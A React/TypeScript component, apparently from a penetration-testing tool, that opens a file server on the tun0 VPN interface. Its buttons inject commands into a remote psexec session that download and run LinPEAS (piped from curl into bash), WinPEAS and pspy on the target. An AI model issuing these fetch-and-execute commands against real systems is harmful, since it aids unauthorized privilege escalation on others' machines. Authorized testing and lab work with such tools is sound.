import InteractiveTerminal from "./InteractiveTerminal";

type PsexecSession = {id: number; command: string};
type PsexecInputRequest = {id: number; data: string};
type PrivescServer = {
  running: boolean; port?: number; base_url?: string;
  available?: {peass?: boolean; pspy?: boolean};
};

export default function PrivescSessionPanel({session, server, serverBusy,
  inputRequest, onToggleServer, onSendCommand, onClose}: {
  session?: PsexecSession; server?: PrivescServer; serverBusy: boolean;
  inputRequest?: PsexecInputRequest;
  onToggleServer: () => void;
  onSendCommand: (command: string) => void;
  onClose: () => void;
}) {
  if (!session) return null;
  const hasPeass = server?.available?.peass ?? true;
  const hasPspy = server?.available?.pspy ?? true;
  return <>
    <section className="privescServer" aria-labelledby="privesc-server-heading">
      <header>
        <h2 id="privesc-server-heading">권한 상승 스크립트 서버 (LinPEAS/WinPEAS/pspy)</h2>
        <small>{server?.running
          ? `tun0에서 서비스 중 · ${server.base_url}`
          : "대상이 접근할 수 있도록 tun0에만 임시 파일서버를 엽니다."}</small>
      </header>
      <div className="privescServerActions">
        <button disabled={serverBusy} onClick={onToggleServer}>
          {serverBusy ? "처리 중…" : server?.running ? "서버 중지" : "서버 시작"}
        </button>
        <button disabled={!server?.running || !hasPeass}
          onClick={() => onSendCommand(
            `curl -sS ${server?.base_url}/peass/linpeas/linpeas.sh | bash`)}>
          LinPEAS 명령 셸에 입력
        </button>
        <button disabled={!server?.running || !hasPeass}
          onClick={() => onSendCommand(
            `curl.exe -o winpeas.exe ${server?.base_url}` +
            `/peass/winpeas/winPEASany.exe && .\\winpeas.exe`)}>
          WinPEAS 명령 셸에 입력
        </button>
        <button disabled={!server?.running || !hasPspy}
          onClick={() => onSendCommand(
            `curl -sS ${server?.base_url}/pspy/pspy64 -o /tmp/pspy64 ` +
            `&& chmod +x /tmp/pspy64 && /tmp/pspy64`)}>
          pspy 명령 셸에 입력
        </button>
      </div>
      {server?.running && !hasPeass &&
        <small>peass가 설치되어 있지 않아 LinPEAS/WinPEAS는 제공할 수 없습니다.</small>}
      {server?.running && !hasPspy &&
        <small>pspy가 설치되어 있지 않아 pspy는 제공할 수 없습니다.</small>}
    </section>
    <InteractiveTerminal sessionId={session.id}
      title={`${session.command} · 검토 후 Enter`}
      initialInput={session.command}
      inputRequest={inputRequest}
      onClose={onClose} />
  </>;
}
